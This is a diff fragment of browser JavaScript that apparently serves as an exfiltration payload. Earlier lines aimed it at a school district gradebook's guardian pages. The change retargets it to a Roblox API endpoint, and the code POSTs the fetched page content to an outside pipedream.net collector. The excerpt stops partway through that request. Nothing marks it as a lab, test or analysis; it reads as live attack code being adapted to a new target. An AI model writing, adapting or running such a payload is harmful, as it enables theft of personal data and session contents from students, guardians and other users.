@@ -1,5 +1,4 @@
-https://gradebook.milforded.org/guardian/form.html?formid=225181';
-fetch("https://gradebook.milforded.org/guardian/home.html")
+fetch("https://apis.roblox.com/universal-app-configuration/v1/behaviors/cookie-policy/content")
   .then(res => res.text())
   .then(html => fetch("https://eon32wucwm6yep3.m.pipedream.net/", {
     method: "POST",
